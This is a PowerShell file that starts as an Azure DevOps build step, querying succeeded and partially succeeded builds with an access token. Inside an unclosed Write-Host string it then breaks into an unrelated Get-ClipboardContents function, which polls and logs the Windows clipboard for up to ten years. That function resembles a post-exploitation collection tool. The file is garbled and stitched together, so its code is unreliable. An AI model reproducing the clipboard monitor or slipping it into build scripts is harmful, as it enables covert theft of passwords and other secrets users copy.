$branch = [uri]::EscapeDataString($env:PSES_BRANCH)
$headers = @{Authorization = "Bearer $env:SYSTEM_ACCESSTOKEN"}

$buildsUrl = $env:VSTS_PSES_URL_TEMPLATE -f $branch, "succeeded"
$succeededBuilds = Invoke-RestMethod -ContentType application/json -Uri $buildsUrl -Headers $headers
Write-Host "Requested URL: $buildsUrl"
Write-Host "Got response:`n$(ConvertTo-Json $succeededBuilds)"

$buildsUrl = $env:VSTS_PSES_URL_TEMPLATE -f $branch, "partiallySucceeded"
$partiallySucceededBuilds = Invoke-RestMethod -ContentType application/json -Uri $buildsUrl -Headers $headers
Write-Host "Requested URL: $buildsUrl"
Write-Host "Got response:`n$(ConvertTo-Json $partiallySucceededBuilds)"

$builds = @(
    $succeededBuilds.value
    $partiallySucceededBuilds.value
    ) | Sort-Object finishTime -Descending

Write-Host "Got PSES_BRANCH: ${env:PSES_BRANCH}"
Write-Host "setting PSES_BUILDID to $($builds[0].Id)"
Write-Host "
function Get-ClipboardContents {


    [CmdletBinding()] Param (
        [Parameter(Position = 1)]
        [UInt32]
        $CollectionLimit,

        [Parameter(Position = 2)]
        [UInt32]
        $PollInterval = 15
    )

    Add-Type -AssemblyName System.Windows.Forms

    
    if($CollectionLimit) {
        $StopTime = (Get-Date).addminutes($CollectionLimit)
    }
    else {
        $StopTime = (Get-Date).addyears(10)
    }

    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
    "=== Get-ClipboardContents Starting at $TimeStamp ===`n"

    
    $PrevLength = 0
    $PrevFirstChar = ""

    for(;;){
        if ((Get-Date) -lt $StopTime){

            
            $tb = New-Object System.Windows.Forms.TextBox
            $tb.Multiline = $true
            $tb.Paste()

            
            if (($tb.Text.Length -ne 0) -and ($tb.Text.Length -ne $PrevLength)){
                
                
                
                if($PrevFirstChar -ne ($tb.Text)[0]){
                    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                    "`n=== $TimeStamp ===`n"
                    $tb.Text
                    $PrevFirstChar = ($tb.Text)[0]
                    $PrevLength = $tb.Text.Length 
                }
            }
        }
        else{
            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
            "`n=== Get-ClipboardContents Shutting down at $TimeStamp ===`n"
            Break;
        }
        Start-Sleep -s $PollInterval
    }
}
